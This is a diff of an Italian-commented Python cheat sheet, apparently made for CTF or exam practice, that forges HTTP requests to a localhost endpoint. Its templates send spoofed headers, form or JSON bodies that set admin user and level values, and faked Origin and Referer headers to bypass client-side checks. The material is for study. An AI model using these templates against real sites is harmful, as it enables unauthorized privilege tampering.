@@ -1,48 +1,98 @@
 #!/usr/bin/env python3
 """
-PRONTUARIO #12: Client-Side Controls & Hidden Fields Bypass
-----------------------------------------------------------
-Modulo: Web Security / Client-Side Validation Bypass
-Descrizione: Script per la manipolazione e l'invio diretto di parametri
-            bloccati o nascosti lato client (es. hidden fields, disabled attributes).
+PRONTUARIO: Client-Side Bypass & Request Forgery
 """
 
 import requests
 
-# ==================== INPUT DATI D'ESAME ====================
-TARGET_URL = "http://127.0.0.1:5000/submit"  # Endpoint di destinazione del form
-# Parametri del form, inclusi quelli nascosti o manipolati (es. is_admin=true)
-FORM_DATA = {
-    "username": "admin",
-    "role": "guest",       # Valore originario limitato dal client
-    "override": "1"        # Parametro nascosto/aggiuntivo sbloccato via script
-}
-# ============================================================
+BASE = "http://localhost:8093"
+URL = f"{BASE}/api/endpoint"
 
 
-def main():
-    print(f"[*] Invio richiesta con parametri forgiati verso: {TARGET_URL}")
-    print(f"[*] Payload inviato: {FORM_DATA}\n")
+# ==============================================================================
+# CASO 1: CUSTOM HEADERS
+# ==============================================================================
+# QUANDO USARLO:
+# - Nel JS trovi: fetch("/api", { headers: { "X-Key": "...", "Authorization": "..." } })
+# - I parametri o i token di autorizzazione sono inviati nelle intestazioni HTTP
+#   e NON nel corpo della richiesta.
+# ==============================================================================
+def caso_1_headers():
+    headers = {
+        "X-Key": "DAJE"
+    }
+    
+    r = requests.post(URL, headers=headers)
+    print("[1] Risposta Headers:", r.text)
 
-    try:
-        # Invio della richiesta POST bypassando i controlli grafici del browser
-        response = requests.post(TARGET_URL, data=FORM_DATA, timeout=5)
-        
-        print(f"[+] Codice Risposta HTTP: {response.status_code}")
-        
-        if "flag{" in response.text:
-            print("=== BYPASS COMPLETATO CON SUCCESSO! ===")
-            start_idx = response.text.find("flag{")
-            end_idx = response.text.find("}", start_idx) + 1
-            print(f" Flag Trovata: {response.text[start_idx:end_idx]}")
-            print("========================================")
-        else:
-            print("[-] Risposta ricevuta ma nessuna flag trovata nel testo:")
-            print(response.text[:300])
 
-    except Exception as e:
-        print(f"[!] Errore di connessione: {e}")
+# ==============================================================================
+# CASO 2: FORM DATA (data=)
+# ==============================================================================
+# QUANDO USARLO:
+# - Nel JS trovi: fetch("/submit", { body: new URLSearchParams({ user: "...", level: ... }) })
+# - C'è un form HTML standard o una richiesta "application/x-www-form-urlencoded"
+# - Vuoi bypassare o modificare i valori dei campi (es. user="admin", level=9999).
+# ==============================================================================
+def caso_2_form_data():
+    data = {
+        "user": "admin",
+        "level": 9999
+    }
+    
+    r = requests.post(URL, data=data)
+    print("[2] Risposta Form Data:", r.text)
+
+
+# ==============================================================================
+# CASO 3: JSON BODY (json=)
+# ==============================================================================
+# QUANDO USARLO:
+# - Nel JS trovi: fetch("/api", { body: JSON.stringify({ user: "...", level: ... }) })
+# - Nel JS c'è l'header: "Content-Type": "application/json"
+# - L'endpoint backend accetta e processa un oggetto JSON.
+# ==============================================================================
+def caso_3_json_body():
+    json_data = {
+        "user": "admin",
+        "level": 9999
+    }
+    
+    r = requests.post(URL, json=json_data)
+    print("[3] Risposta JSON Body:", r.text)
+
+
+# ==============================================================================
+# CASO 4: SESSIONE + ORIGIN / REFERER BYPASS
+# ==============================================================================
+# QUANDO USARLO:
+# - Ricevi errori HTTP "403 Forbidden" o "405 Method Not Allowed" con i metodi sopra.
+# - Il server verifica che la richiesta provenga dallo stesso dominio (Origin/Referer).
+# - Il server richiede un cookie o un ID di sessione generato visitando prima la Home.
+# ==============================================================================
+def caso_4_sessione_e_origin():
+    session = requests.Session()
+
+    # 1. Visita la Home per ottenere eventuali cookie di sessione
+    session.get(BASE)
+
+    # 2. Emula gli header di sicurezza che il browser invia automaticamente con fetch()
+    headers = {
+        "X-Key": "DAJE",
+        "Origin": BASE,
+        "Referer": f"{BASE}/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    }
+
+    r = session.post(URL, headers=headers)
+    print("[4] Risposta Sessione + Origin:", r.text)
 
 
 if __name__ == "__main__":
-    main()
+    # Decommenta la funzione che ti serve in base alla struttura del JS:
+    
+    # caso_1_headers()
+    # caso_2_form_data()
+    # caso_3_json_body()
+    # caso_4_sessione_e_origin()
+    pass
